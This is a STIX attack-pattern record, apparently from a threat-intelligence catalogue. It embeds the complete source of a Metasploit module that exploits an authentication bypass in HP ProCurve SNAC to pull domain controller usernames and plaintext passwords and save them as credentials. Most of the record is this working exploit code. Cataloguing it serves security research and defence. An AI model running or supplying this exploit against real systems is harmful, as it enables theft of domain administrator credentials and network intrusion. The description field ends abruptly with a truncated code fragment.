{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--117ada0b-664c-4819-b6ed-99415ddd46ea",
    "created": "2024-08-14T16:31:40.830241Z",
    "modified": "2024-08-14T16:31:40.830245Z",
    "name": "HP ProCurve SNAC Domain Controller Credential Dumper",
    "description": " This module will extract Domain Controller credentials from vulnerable installations of HP SNAC as distributed with HP ProCurve 4.00 and 3.20. The authentication bypass vulnerability has been used to exploit remote file uploads. This vulnerability can be used to gather important information handled by the vulnerable application, like plain text domain controller credentials. This module has been tested successfully with HP SNAC included with ProCurve Manager 4.0.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/hp_snac_domain_creds.rb",
            "external_id": "hp_snac_domain_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP ProCurve SNAC Domain Controller Credential Dumper',\n      'Description'    => %q{\n        This module will extract Domain Controller credentials from vulnerable installations of HP\n        SNAC as distributed with HP ProCurve 4.00 and 3.20. The authentication bypass vulnerability\n        has been used to exploit remote file uploads. This vulnerability can be used to gather important\n        information handled by the vulnerable application, like plain text domain controller\n        credentials. This module has been tested successfully with HP SNAC included with ProCurve\n        Manager 4.0.\n      },\n      'References'     =>\n        [\n          ['URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03897409']\n        ],\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Auth bypass discovered by\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' =>\n        {\n          'SSL' => true,\n        },\n      'DisclosureDate' => '2013-09-09'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443)\n      ])\n  end\n\n  def get_domain_info(session)\n    res = send_request_cgi({\n      'uri' => \"/RegWeb/RegWeb/GetDomainControllerServlet\",\n      'cookie' => session\n    })\n\n    if res and res.code == 200 and res.body =~ /domainName/\n      return res.body\n    end\n\n    return nil\n  end\n\n  def get_session\n    res = send_request_cgi({ 'uri' => \"/RegWeb/html/snac/index.html\" })\n    session = nil\n    if res and res.code == 200\n      session = res.get_cookies\n    end\n\n    if session and not session.empty?\n      return session\n    end\n\n    return nil\n  end\n\n  def parse_domain_data(data)\n    results = []\n    doc = REXML::Document.new(data)\n\n    doc.elements.each(\"Controllers/Domain\") do |domain|\n      dc_ip = domain.elements['domainControllerIP'].text\n      port = domain.elements['port'].text\n      service = domain.elements['connType'].text\n      user = domain.elements['userName'].text\n      password = domain.elements['password'].text\n      results << [dc_ip, port, service, user, password]\n    end\n\n    return results\n  end\n\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n\n  def run\n\n    print_status(\"Get Domain Info\")\n    session = get_session\n\n    if session.nil?\n      print_error(\"Failed to get a valid session, maybe the target isn't HP SNAC installation?\")\n      return\n    end\n\n    print_status(\"Exploiting Authentication Bypass to gather Domain Controller Info...\")\n    domain_info = get_domain_info(session)\n\n    if domain_info.nil?\n      print_error(\"Failed, maybe the target isn't vulnerable\")\n      return\n    end\n\n    print_status(\"Parsing data gathered...\")\n    credentials = parse_domain_data(domain_info)\n\n    if credentials.empty?\n      print_warning(\"Any Domain Controller has been found...\")\n      return\n    end\n\n    cred_table = Rex::Text::Table.new(\n      'Header'  => 'Domain Controllers Credentials',\n      'Indent'  => 1,\n      'Columns' => ['Domain Controller', 'Username', 'Password']\n    )\n\n    credentials.each do |record|\n      report_cred(\n        ip: record[0],\n        port: record[1],\n        service_name: record[2].downcase,\n        user: record[3],\n        password: record[4],\n        proof: domain_info.inspect\n      )\n      cred_table << [record[0], record[3], record[4]]\n    end\n\n    print_line\n    print_line(cred_table.to_s)\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-09-09"
}